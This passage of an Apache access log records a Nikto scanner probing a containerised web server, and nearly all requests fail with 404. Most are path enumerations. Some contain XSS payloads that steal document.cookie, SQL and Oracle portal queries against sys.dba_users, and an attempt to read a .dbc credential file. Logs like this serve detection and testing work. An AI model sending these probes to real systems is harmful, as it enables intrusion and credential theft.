wEPdKM50lk0mkAY2PpnPojN6vMoBFVas4CRBTkY9jhYMVKTPOIbKVnjlqIFXVWVU7pZTjtQAdXZ6gdWxAeHoJilpYP2HVqQvwXA6mOFTuFt2ZKyC2jG5e4h7nvjdoTH9tmVwMDf72MmTjHwSkaXSzXw7j6FhoIYNz0PPFNZK1xiLbPCXUVVOMd1d383ikVe0Gpm460bWB9ikjYOBdJtmUvu1OMV74pxuOZ34RYplPtPrsjV8SYEfHmcBhoWcBUe8Er2y2PF4dY9myzNKLlyy3mlpts3mI3NehaXBDxpkJeiN7KO3ni7h0d3eSrySjk1XpfD50zg9oGcsBO2pb752FMXoK1o5Nbo7PsxdpwWSf9yBQSIvhyOkxQn0IkyoTTHhvQ58g3xEWkIZymoGVWmTRN6rFxOUJFMTGlAEAC8CL6oNZHfCyWoBjfKTQtlfnvG4OX9ZdLTkd0mZrUdGuNgvJlN8avL6pgOhoYeJ23cFZnWG<script>alert(foo)</script> HTTP/1.1" 302 477 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003412)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /j2ee/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003413)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /perl/printenv HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003415)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /perl-status HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003416)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /WebCacheDemo.html HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003417)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webcache/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003418)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webcache/webcache.xml HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003419)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bmp/ HTTP/1.1" 404 494 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003420)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bmp/global-web-application.xml HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003421)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bmp/JSPClient.java HTTP/1.1" 404 473 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003422)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bmp/mime.types HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003423)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bmp/README.txt HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003424)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bmp/sqljdemo.jsp HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003425)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bmp/setconn.jsp HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003426)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /ptg_upgrade_pkg.log HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003427)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_HTML/oam/weboam.log HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003428)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webapp/admin/_pages/_bc4jadmin/ HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003429)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_pages/_webapp/_admin/_showpooldetails.java HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003430)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_pages/_webapp/_admin/_showjavartdetails.java HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003431)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_pages/_demo/ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003432)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_pages/_webapp/_jsp/ HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003433)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_pages/_demo/_sql/ HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003434)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET //OA_HTML/_pages/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003435)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_HTML/webtools/doc/index.html HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003436)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /reports/rwservlet?server=repserv+report=/tmp/hacker.rdf+destype=cache+desformat=PDF HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003437)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /apex/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003438)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_JAVA/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003439)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_HTML/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003440)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /aplogon.html HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003441)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /appdet.html HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003442)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /servlets/weboam/oam/oamLogin HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003443)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_HTML/PTB/mwa_readme.htm HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003444)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /reports/rwservlet HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003445)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /reports/rwservlet/showenv HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003446)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /reports/rwservlet/showmap HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003447)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /reports/rwservlet/showjobs HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003448)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /reports/rwservlet/getjobid7?server=myrep HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003449)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /reports/rwservlet/getjobid4?server=myrep HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003450)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /reports/rwservlet/showmap?server=myserver HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003451)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/owa_util.cellsprint?p_theQuery=select HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003452)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/owa_util.listprint?p_theQuery=select HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003453)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/owa_util.show_query_columns?ctable=sys.dba_users HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003454)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/owa_util.showsource?cname=owa_util HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003455)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/owa_util.cellsprint?p_theQuery=select+*+from+sys.dba_users HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003456)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/owa_util.signature HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003457)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/HTP.PRINT HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003458)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/CXTSYS.DRILOAD.VALIDATE_STMT HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003459)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/PORTAL_DEMO.ORG_CHART.SHOW HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003460)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/PORTAL.wwv_form.genpopuplist HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003461)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/PORTAL.wwv_ui_lovf.show HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003462)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/PORTAL.wwa_app_module.link HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003463)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/PORTAL.wwv_dynxml_generator.show HTTP/1.1" 404 534 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003464)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/PORTAL.home HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003465)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/PORTAL.wwv_setting.render_css HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003466)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/PORTAL.wwv_main.render_warning_screen?p_oldurl=inTellectPRO&p_newurl=inTellectPRO HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003467)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/SELECT HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003468)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pls/portal/null HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003469)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_MEDIA/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003470)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_HTML/META-INF/ HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003471)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_HTML/jsp/por/services/login.jsp HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003472)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_HTML/PTB/ICXINDEXBASECASE.htm HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003473)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_HTML/PTB/ECXOTAPing.htm HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003474)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_HTML/PTB/xml_sample1.htm HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003475)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_HTML/jsp/wf/WFReassign.jsp HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003476)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_JAVA/Oracle/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003477)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_JAVA/servlet.zip HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003478)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_JAVA/oracle/forms/registry/Registry.dat HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003479)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_HTML/oam/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003480)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_HTML/jsp/ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003481)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_HTML/jsp/fnd/fndversion.jsp HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003482)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_HTML/jsp/fnd/fndhelp.jsp?dbc=/u01/oracle/prodappl/fnd/11.5.0/secure/dbprod2_prod.dbc HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003483)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /OA_HTML/jsp/fnd/fndhelputil.jsp HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003484)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /install/install.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003485)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "POST /_vti_bin/shtml.dll/_vti_rpc HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003486)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cehttp/trace HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003487)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cehttp/property/ HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003488)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webdav/index.html HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003489)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /hp-ux/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003490)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /hp_docs/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003491)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /hp_docs/cgi-bin/index.cgi HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003492)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /hp_docs/xmltools/ HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003493)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /status?full=true HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003496)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rpc.php?q=\\\"><script>alert(document.cookie)</script> HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003497)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /db.php?q='&t=' HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003499)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /rpc.php?q='&t=' HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003500)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /junk.cfm HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003501)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /jsp-examples/ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003502)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /nps/iManager.html HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003503)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /nps/version.jsp HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003504)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /nps/servlet/webacc?taskId=dev.Empty&merge=fw.About HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003505)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/Judy/demo/ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003506)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/vxvm/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003508)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/PRINTER-JPN-S HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003509)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/PRINTER-JPN-E HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003510)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/NTP_Primer.txt HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003511)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/LICENSE.SMAIL893 HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003512)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/PRINT-ASE-NOTE HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003513)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/SETNETLP_Guide-E HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003514)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/SETNETLP_Guide-S HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003515)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/dir.perm.txt HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003516)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/ASX-UTF8 HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003517)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/ASX-TCH HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003518)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/ASX-SCH HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003519)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/ASX-KOR HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003520)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/ASX-JPN-S HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003521)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/ASX-JPN-E HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003522)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/ASX-JPN HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003523)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/11iSRB.txt HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003524)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/11iRelNotes.txt HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003525)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/11iRelNotes.html HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003526)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/11.00RelNotes HTTP/1.1" 404 472 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003527)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/Judy/ HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003528)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/TechPrtServ/ HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003529)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/sw_patches.txt HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003530)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/Judy/COPYRIGHT HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003531)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/Judy/Judy1_3x.htm HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003532)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/Judy/Judy1_funcs_3x.htm HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003533)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/Judy/JudyL_funcs_3x.htm HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003534)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/Judy/JudySL_funcs_3x.htm HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003535)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/Judy/Judy_3x.htm HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003536)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/Judy/JudySL_3x.htm HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003537)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/Judy/JudyL_3x.htm HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003538)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/Judy/LICENSE HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003539)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/Judy/demo/JudySort.c HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003540)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/Judy/demo/Makefile HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003541)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/Judy/demo/funhist.c HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003542)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/Judy/demo/interSL.c HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003543)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/icodUserGuide.pdf HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003544)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/planning_SuperDome_configs.pdf HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003545)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/vxvm/pitc_ag.pdf HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003546)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/Judy/Judy_tech_book.pdf HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003547)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/vxvm/vxvm_ag.pdf HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003548)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/vxvm/vxvm_hwnotes.pdf HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003549)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/vxvm/vxvm_ig.pdf HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003550)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/vxvm/vxvm_mig.pdf HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003551)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /doc/vxvm/vxvm_tshoot.pdf HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003552)"
